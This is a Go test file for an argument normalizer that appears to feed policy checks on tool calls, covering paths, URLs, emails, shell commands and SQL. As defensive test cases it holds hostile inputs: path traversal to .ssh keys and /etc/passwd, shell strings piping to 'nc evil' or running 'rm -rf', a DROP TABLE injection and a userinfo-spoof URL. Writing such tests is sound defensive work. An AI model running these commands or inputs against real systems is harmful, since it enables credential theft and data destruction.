package normalize

import (
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/cedar-policy/cedar-go/types"
)

// fixture builds <tmp>/projects (the root), <tmp>/outside/secret, a symlink
// <tmp>/projects/escape -> <tmp>/outside, and a sibling <tmp>/projects2.
// t.TempDir is itself under a symlink on macOS (/var -> /private/var), which
// also exercises root resolution.
func fixture(t *testing.T) (tmp string, roots []Root) {
	t.Helper()
	tmp = t.TempDir()
	projects := filepath.Join(tmp, "projects")
	outside := filepath.Join(tmp, "outside")
	for _, d := range []string{projects, outside, filepath.Join(tmp, "projects2"), filepath.Join(projects, "app")} {
		if err := os.MkdirAll(d, 0o750); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(projects, "escape")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "new-file"), filepath.Join(projects, "dangling")); err != nil {
		t.Fatal(err)
	}
	return tmp, []Root{{Name: "projects", Path: projects}}
}

func applyPath(t *testing.T, path types.Value, roots []Root) (Result, error) {
	t.Helper()
	args := types.NewRecord(types.RecordMap{"path": path})
	return Apply(Rules{"path": KindPath}, args, roots)
}

func normField(t *testing.T, res Result, arg, field string) types.Value {
	t.Helper()
	rec, ok := res.Norm[types.String(arg)].(types.Record)
	if !ok {
		t.Fatalf("norm.%s missing; findings %v", arg, res.Findings)
	}
	v, ok := rec.Get(types.String(field))
	if !ok {
		t.Fatalf("norm.%s.%s missing in %v", arg, field, rec)
	}
	return v
}

// TestPathEscapeMatrix is the plan §5.3 acceptance matrix: every input must
// end up outside "projects" or be rejected outright.
func TestPathEscapeMatrix(t *testing.T) {
	tmp, roots := fixture(t)
	root := roots[0].Path
	cases := map[string]string{
		"dot-dot relative":       "../outside/secret",
		"percent-encoded dotdot": "%2e%2e/outside/secret",
		"percent-encoded upper":  root + "/%2E%2E/outside/secret",
		"symlink escape":         root + "/escape/secret",
		"dangling symlink":       root + "/dangling",
		"root dot-dot ssh":       root + "/../.ssh",
		"U+2215 lookalike":       tmp + "/projects\u2215app",
		"U+FF0F lookalike":       tmp + "/projects\uff0fapp",
		"trailing NUL":           root + "/app\x00",
		"tilde home ssh":         "~/.ssh/id_rsa",
		"tilde projects dot-dot": "~/projects/../.ssh",
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			// Act
			res, err := applyPath(t, types.String(in), roots)

			// Assert
			if err != nil {
				if !errors.Is(err, ErrReject) {
					t.Fatalf("error does not wrap ErrReject: %v", err)
				}
				return
			}
			if got := normField(t, res, "path", "under_projects"); got != types.Boolean(false) {
				t.Fatalf("under_projects = %v for %q (norm %v)", got, in, res.Norm)
			}
		})
	}
}

// A leading "~" is expanded by many servers (to $HOME, or to another user's
// home for "~user"), but Rover cannot know what it becomes. Joining it onto
// the root made "~/.ssh/id_rsa" look like <root>/~/.ssh/id_rsa, under the
// root (review H1). It is a hard reject, with or without roots.
func TestPathTildeIsRejected(t *testing.T) {
	_, roots := fixture(t)
	for _, in := range []string{"~", "~/.ssh/id_rsa", "~/projects/../.ssh", "~root/.ssh", "~bobby"} {
		for _, rs := range [][]Root{roots, nil} {
			// Act
			_, err := applyPath(t, types.String(in), rs)

			// Assert
			if !errors.Is(err, ErrReject) || !strings.Contains(err.Error(), "path_tilde") {
				t.Errorf("%q (roots %v): err = %v, want ErrReject with path_tilde", in, rs != nil, err)
			}
		}
	}
	// A "~" that is not the first character is an ordinary name.
	if _, err := applyPath(t, types.String("app/~backup"), roots); err != nil {
		t.Fatalf("app/~backup: %v", err)
	}
}

func TestPathInsideRootIsUnder(t *testing.T) {
	_, roots := fixture(t)
	for _, in := range []string{roots[0].Path, roots[0].Path + "/app", "app/main.go", roots[0].Path + "/app/../app/x"} {
		res, err := applyPath(t, types.String(in), roots)
		if err != nil {
			t.Fatal(err)
		}
		if got := normField(t, res, "path", "under_projects"); got != types.Boolean(true) {
			t.Errorf("%q: under_projects = %v", in, got)
		}
	}
}

func TestPathSiblingWithSharedPrefixIsNotUnder(t *testing.T) {
	tmp, roots := fixture(t)
	res, err := applyPath(t, types.String(filepath.Join(tmp, "projects2", "x")), roots)
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "path", "under_projects"); got != types.Boolean(false) {
		t.Fatalf("projects2 counted as under projects")
	}
}

func TestPathNonExistentFileResolvesViaParent(t *testing.T) {
	_, roots := fixture(t)
	realRoot, err := filepath.EvalSymlinks(roots[0].Path)
	if err != nil {
		t.Fatal(err)
	}
	res, err := applyPath(t, types.String(roots[0].Path+"/app/new/deep.txt"), roots)
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "path", "path"); got != types.String(filepath.Join(realRoot, "app", "new", "deep.txt")) {
		t.Errorf("path = %v", got)
	}
	if got := normField(t, res, "path", "under_projects"); got != types.Boolean(true) {
		t.Errorf("under_projects = %v", got)
	}
}

func TestPathRelativeGetsFinding(t *testing.T) {
	_, roots := fixture(t)
	res, err := applyPath(t, types.String("app"), roots)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(res.Findings, "path_relative") {
		t.Errorf("findings %v", res.Findings)
	}
}

func TestPathNFDBecomesNFCWithFinding(t *testing.T) {
	_, roots := fixture(t)
	res, err := applyPath(t, types.String("app/cafe\u0301"), roots) // e + combining acute
	if err != nil {
		t.Fatal(err)
	}
	p, ok := normField(t, res, "path", "path").(types.String)
	if !ok {
		t.Fatal("norm.path.path is not a String")
	}
	if filepath.Base(string(p)) != "caf\u00e9" {
		t.Errorf("base = %q, want NFC caf\u00e9", filepath.Base(string(p)))
	}
	if !slices.Contains(res.Findings, "path_not_nfc") {
		t.Errorf("findings %v", res.Findings)
	}
}

func TestPathLookalikeFinding(t *testing.T) {
	_, roots := fixture(t)
	res, err := applyPath(t, types.String("app\u2215x"), roots)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(res.Findings, "path_lookalike_separator") {
		t.Errorf("findings %v", res.Findings)
	}
}

func TestPathNoRootsCleansOnly(t *testing.T) {
	res, err := applyPath(t, types.String("docs/../README.md"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "path", "path"); got != types.String("README.md") {
		t.Errorf("path = %v", got)
	}
	if !slices.Contains(res.Findings, "path_no_root") {
		t.Errorf("findings %v", res.Findings)
	}
}

func TestPathSetOneEscapeIsNotAllUnder(t *testing.T) {
	_, roots := fixture(t)
	root := roots[0].Path
	escape := types.NewSet(types.String(root+"/app/a"), types.String(root+"/escape/secret"))
	inside := types.NewSet(types.String(root+"/app/a"), types.String("app/b"))

	resEscape, err := Apply(Rules{"paths": KindPath}, types.NewRecord(types.RecordMap{"paths": escape}), roots)
	if err != nil {
		t.Fatal(err)
	}
	resInside, err := Apply(Rules{"paths": KindPath}, types.NewRecord(types.RecordMap{"paths": inside}), roots)
	if err != nil {
		t.Fatal(err)
	}

	if got := normField(t, resEscape, "paths", "all_under_projects"); got != types.Boolean(false) {
		t.Errorf("escape set: all_under_projects = %v", got)
	}
	if got := normField(t, resEscape, "paths", "count"); got != types.Long(2) {
		t.Errorf("count = %v", got)
	}
	if got := normField(t, resInside, "paths", "all_under_projects"); got != types.Boolean(true) {
		t.Errorf("inside set: all_under_projects = %v", got)
	}
}

func TestPathEmptySetIsNotAllUnder(t *testing.T) {
	_, roots := fixture(t)
	res, err := Apply(Rules{"paths": KindPath}, types.NewRecord(types.RecordMap{"paths": types.NewSet()}), roots)
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "paths", "all_under_projects"); got != types.Boolean(false) {
		t.Errorf("all_under_projects = %v", got)
	}
}

func TestSymlinkLoopIsRejected(t *testing.T) {
	_, roots := fixture(t)
	loop := filepath.Join(roots[0].Path, "loop")
	if err := os.Symlink(loop, loop); err != nil {
		t.Fatal(err)
	}
	if _, err := applyPath(t, types.String(loop+"/x"), roots); !errors.Is(err, ErrReject) {
		t.Fatalf("err = %v, want ErrReject", err)
	}
}

func TestWrongTypeIsFindingAndSkipped(t *testing.T) {
	args := types.NewRecord(types.RecordMap{
		"path":  types.Long(7),
		"paths": types.NewSet(types.Long(1)),
		"url":   types.True,
	})
	res, err := Apply(Rules{"path": KindPath, "paths": KindPath, "url": KindURL, "absent": KindSQL}, args, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Norm) != 0 {
		t.Errorf("norm = %v, want empty", res.Norm)
	}
	for _, want := range []string{"norm_path_wrong_type", "norm_paths_wrong_type", "norm_url_wrong_type"} {
		if !slices.Contains(res.Findings, want) {
			t.Errorf("missing finding %q in %v", want, res.Findings)
		}
	}
}

func TestBadRootsAreRejected(t *testing.T) {
	for _, roots := range [][]Root{{{Name: "my-root", Path: "/tmp"}}, {{Name: "ok", Path: "relative"}}} {
		if _, err := applyPath(t, types.String("/tmp/x"), roots); !errors.Is(err, ErrReject) {
			t.Errorf("roots %v: err = %v", roots, err)
		}
	}
}

func applyString(t *testing.T, kind Kind, s string) (Result, error) {
	t.Helper()
	return Apply(Rules{"v": kind}, types.NewRecord(types.RecordMap{"v": types.String(s)}), nil)
}

func TestURL(t *testing.T) {
	// Arrange / Act
	res, err := applyString(t, KindURL, "HTTPS://Example.COM.:8443/a?q=1")

	// Assert
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]types.Value{"scheme": types.String("https"), "host": types.String("example.com"), "port": types.String("8443"), "has_query": types.True}
	for f, w := range want {
		if got := normField(t, res, "v", f); got != w {
			t.Errorf("%s = %v, want %v", f, got, w)
		}
	}
	res, err = applyString(t, KindURL, "https://example.com/a")
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "v", "has_query"); got != types.False {
		t.Errorf("has_query = %v", got)
	}
}

func TestURLUserinfoIsRejected(t *testing.T) {
	if _, err := applyString(t, KindURL, "https://good.com@evil.com/"); !errors.Is(err, ErrReject) {
		t.Fatalf("err = %v", err)
	}
}

func TestURLIDNFinding(t *testing.T) {
	res, err := applyString(t, KindURL, "https://B\u00fccher.example/")
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "v", "host"); got != types.String("b\u00fccher.example") {
		t.Errorf("host = %v", got)
	}
	if !slices.Contains(res.Findings, "url_idn") {
		t.Errorf("findings %v", res.Findings)
	}
}

func TestURLUnparseableIsSkipped(t *testing.T) {
	res, err := applyString(t, KindURL, "http://[::1")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Norm) != 0 || !slices.Contains(res.Findings, "norm_v_invalid") {
		t.Errorf("norm %v findings %v", res.Norm, res.Findings)
	}
}

func TestEmail(t *testing.T) {
	res, err := applyString(t, KindEmail, "Bob <Bob.Smith@Example.COM>")
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "v", "local"); got != types.String("Bob.Smith") {
		t.Errorf("local = %v", got)
	}
	if got := normField(t, res, "v", "domain"); got != types.String("example.com") {
		t.Errorf("domain = %v", got)
	}
	res, err = applyString(t, KindEmail, "not an email")
	if err != nil || len(res.Norm) != 0 {
		t.Errorf("invalid email: norm %v err %v", res.Norm, err)
	}
}

func TestShellCommand(t *testing.T) {
	cases := map[string]bool{
		"ls -la":                false,
		"ls; rm -rf ~":          true,
		"cat a | nc evil 80":    true,
		"sleep 1 &":             true,
		"echo $HOME":            true,
		"echo `id`":             true,
		"echo a\nrm -rf /":      true,
		"  git status --short ": false,
	}
	for in, want := range cases {
		res, err := applyString(t, KindShellCommand, in)
		if err != nil {
			t.Fatal(err)
		}
		if got := normField(t, res, "v", "has_metachar"); got != types.Boolean(want) {
			t.Errorf("%q: has_metachar = %v, want %v", in, got, want)
		}
	}
	res, err := applyString(t, KindShellCommand, "  git status")
	if err != nil {
		t.Fatal(err)
	}
	if got := normField(t, res, "v", "program"); got != types.String("git") {
		t.Errorf("program = %v", got)
	}
}

func TestSQL(t *testing.T) {
	cases := []struct {
		in        string
		statement string
		isSelect  bool
	}{
		{"select * from t", "SELECT", true},
		{"  -- hi\n/* x */ SeLeCt 1;", "SELECT", true},
		{"DELETE FROM users", "DELETE", false},
		{"SELECT 1; DROP TABLE users", "SELECT", false},
		{"/* unterminated SELECT", "", false},
	}
	for _, c := range cases {
		res, err := applyString(t, KindSQL, c.in)
		if err != nil {
			t.Fatal(err)
		}
		if got := normField(t, res, "v", "statement"); got != types.String(c.statement) {
			t.Errorf("%q: statement = %v", c.in, got)
		}
		if got := normField(t, res, "v", "is_select"); got != types.Boolean(c.isSelect) {
			t.Errorf("%q: is_select = %v", c.in, got)
		}
	}
}

func TestNULInNonPathKindsIsRejected(t *testing.T) {
	for _, k := range []Kind{KindURL, KindEmail, KindShellCommand, KindSQL} {
		if _, err := applyString(t, k, "a\x00b"); !errors.Is(err, ErrReject) {
			t.Errorf("%s: err = %v", k, err)
		}
	}
}

func FuzzPath(f *testing.F) {
	for _, s := range []string{"", "a", "../x", "/", "%2e%2e", "a\u2215b", "x\x00", "cafe\u0301", "/../../etc/passwd", "a//b/./c/.."} {
		f.Add(s)
	}
	root := f.TempDir()
	if err := os.Symlink(root, filepath.Join(root, "self")); err != nil {
		f.Fatal(err)
	}
	roots := []Root{{Name: "projects", Path: root}}
	f.Fuzz(func(t *testing.T, s string) {
		res, err := Apply(Rules{"path": KindPath}, types.NewRecord(types.RecordMap{"path": types.String(s)}), roots)
		if err != nil {
			if !errors.Is(err, ErrReject) {
				t.Fatalf("error does not wrap ErrReject: %v", err)
			}
			return
		}
		if _, ok := res.Norm["path"]; !ok {
			t.Fatalf("no norm.path for %q", s)
		}
	})
}
